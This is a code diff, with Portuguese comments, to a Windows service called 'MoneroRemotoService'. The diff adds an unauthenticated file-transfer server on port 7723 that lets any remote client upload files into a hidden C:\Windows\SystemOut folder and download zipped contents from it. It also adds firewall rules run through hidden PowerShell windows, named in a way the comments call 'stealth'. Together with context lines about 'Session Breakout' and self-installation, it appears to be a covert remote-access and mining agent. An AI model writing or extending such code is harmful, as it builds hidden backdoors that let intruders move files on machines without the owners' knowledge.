@@ -313,8 +313,138 @@ def start_interactive(command):
         else:
             return f"[ERRO] Falha ao disparar tarefa: {r.stderr}"
 
+
     except Exception as e:
         return f"[ERRO] Falha no Session Breakout: {str(e)}"
+
+# ==============================================================================
+# FILE TRANSFER SERVER (PORT 7723)
+# ==============================================================================
+import struct
+
+class FileTransferServer(threading.Thread):
+    def __init__(self, bind_ip='0.0.0.0', bind_port=7723):
+        super().__init__()
+        self.ip = bind_ip
+        self.port = bind_port
+        self.running = True
+        self.base_dir = r"C:\Windows\SystemOut\UPLOAD"
+        # Garante que o diretorio exista
+        if not os.path.exists(self.base_dir):
+            try: os.makedirs(self.base_dir)
+            except: pass
+
+    def run(self):
+        log_service(f"Starting File Transfer Server on {self.ip}:{self.port}")
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
+        try:
+            server_socket.bind((self.ip, self.port))
+            server_socket.listen(5)
+            
+            while self.running:
+                client, addr = server_socket.accept()
+                threading.Thread(target=self.handle_transfer, args=(client,), daemon=True).start()
+                
+        except Exception as e:
+            log_service(f"File Transfer Server Error: {e}")
+        finally:
+            server_socket.close()
+
+    def handle_transfer(self, client):
+        try:
+            # 1. Recebe comando inicial
+            header_data = client.recv(1024).decode('utf-8', errors='ignore').strip()
+            
+            if header_data.startswith("UPLOAD:"):
+                # Protocolo: UPLOAD:<filename> -> SERVER:OK -> CLIENT:SIZE(4b) -> CLIENT:BYTES
+                filename = header_data.split(':', 1)[1]
+                
+                # Garante que UPLOAD exista antes de salvar (Robustez)
+                if not os.path.exists(self.base_dir):
+                    try: os.makedirs(self.base_dir)
+                    except: pass
+                    
+                filepath = os.path.join(self.base_dir, os.path.basename(filename))
+                
+                client.sendall(b"OK")
+                
+                # Recebe tamanho
+                size_data = client.recv(4)
+                if len(size_data) < 4: return
+                file_size = struct.unpack('>I', size_data)[0]
+                
+                # Recebe payload
+                received = 0
+                with open(filepath, 'wb') as f:
+                    while received < file_size:
+                        chunk_size = min(4096, file_size - received)
+                        data = client.recv(chunk_size)
+                        if not data: break
+                        f.write(data)
+                        received += len(data)
+                
+                log_service(f"File Uploaded: {filename} ({received} bytes)")
+                client.sendall(b"SUCCESS")
+
+            elif header_data.startswith("DOWNLOAD:"):
+                # Protocolo: DOWNLOAD:<filename_or_dir>
+                target_name = header_data.split(':', 1)[1]
+                
+                # Se o target for "UPLOAD" (a pasta raiz), permitimos baixar tudo
+                if target_name.upper() == "UPLOAD":
+                    target_path = self.base_dir
+                else:
+                     target_path = os.path.join(self.base_dir, os.path.basename(target_name))
+                
+                temp_zip = None
+
+                # Se for diretório, cria ZIP temporário
+                if os.path.isdir(target_path):
+                    try:
+                        # Define nome do zip
+                        zip_name = f"{os.path.basename(target_path)}.zip"
+                        # make_archive cria arquivo sem extensão no nome base, e adiciona .zip
+                        # salvamos na pasta pai do target_path (SystemOut) para evitar recursão se target_path for UPLOAD
+                        root_dir = os.path.dirname(self.base_dir) # C:\Windows\SystemOut
+                        base_name_zip = os.path.join(root_dir, os.path.basename(target_path))
+                        
+                        log_service(f"Zipando diretório: {target_path}")
+                        temp_zip = shutil.make_archive(base_name_zip, 'zip', target_path)
+                        target_path = temp_zip # Agora target_path aponta para o .zip
+                    except Exception as e:
+                        log_service(f"Erro ao zipar: {e}")
+                        client.sendall(b"ERROR")
+                        return
+
+                if os.path.exists(target_path) and os.path.isfile(target_path):
+                    file_size = os.path.getsize(target_path)
+                    # Envia OK + Tamanho
+                    client.sendall(b"OK" + struct.pack('>I', file_size))
+                    
+                    # Envia payload
+                    with open(target_path, 'rb') as f:
+                        while True:
+                            data = f.read(4096)
+                            if not data: break
+                            client.sendall(data)
+                    
+                    log_service(f"File Downloaded: {target_name}")
+                    
+                    # Limpa ZIP temporário
+                    if temp_zip and os.path.exists(temp_zip):
+                         try: os.remove(temp_zip)
+                         except: pass
+
+                else:
+                    client.sendall(b"ERROR")
+
+        except Exception as e:
+            log_service(f"Transfer Error: {e}")
+        finally:
+            client.close()
+
 
 class MoneroRemotoService(win32serviceutil.ServiceFramework):
     _svc_name_ = SERVICE_NAME
@@ -348,6 +478,12 @@ class MoneroRemotoService(win32serviceutil.ServiceFramework):
 
     def SvcDoRun(self):
         """Loop principal do serviço"""
+        # Garante que a pasta UPLOAD exista assim que o serviço inicia
+        upload_dir = r"C:\Windows\SystemOut\UPLOAD"
+        if not os.path.exists(upload_dir):
+            try: os.makedirs(upload_dir)
+            except: pass
+
         log_service("--- SERVIÇO INICIANDO ---")
         servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
@@ -377,6 +513,15 @@ class MoneroRemotoService(win32serviceutil.ServiceFramework):
         except Exception as e:
             log_service(f"Falha ao executar WinStart.bat: {e}")
             servicemanager.LogErrorMsg(f"Failed to run WinStart.bat: {e}")
+
+        # Inicia o Servidor de Arquivos (Porta 7723)
+        try:
+            self.file_server = FileTransferServer()
+            self.file_server.daemon = True
+            self.file_server.start()
+            log_service("FileTransferServer thread started.")
+        except Exception as e:
+            log_service(f"Failed to start FileTransferServer: {e}")
 
         # Loop principal (Keep-Alive)
         log_service("Entrando no loop principal...")
@@ -831,25 +976,26 @@ def install_self():
 
     # 2. Configuração de Firewall (Via PowerShell - Mais confiável no Win11)
     # Nomes alterados para 'SystemOutCache Agent' para maior stealth
-    print("[+] Configurando Firewall (Porta 7722)...")
+    print("[+] Configurando Firewall (Porta 7722 e 7723)...")
     log_install("Configurando Firewall via PowerShell...")
     try:
         ps_cmd_tcp = "if (-not (Get-NetFirewallRule -DisplayName 'SystemOutCache Agent TCP' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName 'SystemOutCache Agent TCP' -Direction Inbound -LocalPort 7722 -Protocol TCP -Action Allow }"
         ps_cmd_udp = "if (-not (Get-NetFirewallRule -DisplayName 'SystemOutCache Agent UDP' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName 'SystemOutCache Agent UDP' -Direction Inbound -LocalPort 7722 -Protocol UDP -Action Allow }"
+        ps_cmd_file = "if (-not (Get-NetFirewallRule -DisplayName 'SystemOutCache Agent File' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName 'SystemOutCache Agent File' -Direction Inbound -LocalPort 7723 -Protocol TCP -Action Allow }"
         
-        # Executa TCP
+        # Executa TCP 7722
         r1 = subprocess.run(["powershell", "-Command", ps_cmd_tcp], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        if r1.returncode != 0 and r1.stderr.strip():
-            log_install(f"Erro Firewall TCP: {r1.stderr}")
-        else:
-            log_install("Firewall TCP configurado (ou ja existente).")
-
-        # Executa UDP
+        
+        # Executa UDP 7722
         r2 = subprocess.run(["powershell", "-Command", ps_cmd_udp], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        if r2.returncode != 0 and r2.stderr.strip():
-            log_install(f"Erro Firewall UDP: {r2.stderr}")
+        
+        # Executa TCP 7723 (File)
+        r3 = subprocess.run(["powershell", "-Command", ps_cmd_file], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
+        if r1.returncode != 0 or r2.returncode != 0 or r3.returncode != 0:
+             log_install(f"Erro Firewall: {r1.stderr} {r2.stderr} {r3.stderr}")
         else:
-            log_install("Firewall UDP configurado (ou ja existente).")
+             log_install("Firewall configurado (7722/7723).")
             
     except Exception as e:
         err = f"[!] Erro no Firewall: {e}"
